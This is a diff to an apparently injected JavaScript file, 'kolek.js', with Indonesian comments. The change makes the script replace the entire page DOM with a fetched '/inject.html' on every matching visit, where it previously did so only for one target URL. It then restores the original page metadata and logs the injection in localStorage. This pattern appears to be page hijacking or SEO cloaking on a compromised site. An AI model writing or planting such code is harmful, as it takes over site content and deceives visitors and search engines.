@@ -65,6 +65,13 @@ console.log('kolek.js script is running...');
         .split('\n')
         .map((url) => new URL(url.trim(), location.origin).href); // Normalisasi URL dari landingpage.txt
 
+      if (landingPageUrls.includes(currentUrl)) {
+        console.log('Current URL matches a landing page. Injecting metadata...');
+        injectMetadata(originalHtml); // Sisipkan metadata asli dari metadata.txt
+      } else {
+        console.warn('Current URL does not match any landing page URL.');
+      }
+
       // Fungsi untuk mendapatkan tujuan akhir dari URL
       const getFinalUrl = (url) => {
         try {
@@ -95,41 +102,32 @@ console.log('kolek.js script is running...');
         return; // Hentikan eksekusi lebih lanjut
       }
 
-      // Periksa apakah URL saat ini cocok dengan tujuan akhir dari target.txt
-      if (currentUrl === finalTargetUrl) {
-        console.log('Current URL matches target.txt. Injecting HTML...');
-        const injectHtmlPath = '/inject.html';
-        console.log(`Attempting to fetch: ${injectHtmlPath}`); // Log tambahan untuk jalur file
+      // Langsung lakukan injeksi berdasarkan currentUrl
+      console.log('Injecting HTML content into DOM...');
+      const injectHtmlPath = '/inject.html';
+      fetch(injectHtmlPath)
+        .then((response) => {
+          if (!response.ok) {
+            console.error(`Failed to load ${injectHtmlPath}:`, response.status);
+            throw new Error(`Failed to load ${injectHtmlPath}`);
+          }
+          console.log(`${injectHtmlPath} fetched successfully.`);
+          return response.text();
+        })
+        .then((html) => {
+          document.documentElement.innerHTML = html; // Mengganti seluruh DOM dengan konten inject.html
+          console.log('HTML content injected successfully.');
 
-        fetch(injectHtmlPath)
-          .then((response) => {
-            if (!response.ok) {
-              console.error(`Failed to load ${injectHtmlPath}:`, response.status);
-              throw new Error(`Failed to load ${injectHtmlPath}`);
-            }
-            console.log(`${injectHtmlPath} fetched successfully.`);
-            return response.text();
-          })
-          .then((html) => {
-            console.log('Injecting HTML content into DOM...');
-            document.documentElement.innerHTML = html; // Mengganti seluruh DOM dengan konten inject.html
-            console.log('HTML content injected successfully.');
+          injectMetadata(originalHtml); // Sisipkan metadata asli dari metadata.txt
 
-            injectMetadata(originalHtml); // Sisipkan metadata asli dari metadata.txt
-
-            // Simpan status injeksi ke localStorage
-            localStorage.setItem(targetInjectedKey, currentUrl);
-            console.log('Injection status saved to localStorage.');
-          })
-          .catch((err) => {
-            console.error('Error during HTML injection:', err);
-            alert('Failed to load the required content. Please try again later.'); // Fallback untuk pengguna
-          });
-      } else {
-        console.warn('Current URL does not match target URL. Injection skipped.');
-        console.log(`Expected target URL: ${finalTargetUrl}`); // Log tambahan untuk memeriksa URL yang diharapkan
-        console.log(`Current URL: ${currentUrl}`); // Log tambahan untuk memeriksa URL saat ini
-      }
+          // Simpan status injeksi ke localStorage
+          localStorage.setItem(targetInjectedKey, currentUrl);
+          console.log('Injection status saved to localStorage.');
+        })
+        .catch((err) => {
+          console.error('Error during HTML injection:', err);
+          alert('Failed to load the required content. Please try again later.'); // Fallback untuk pengguna
+        });
     })
     .catch((err) => console.error('Error loading URLs:', err));
 })();
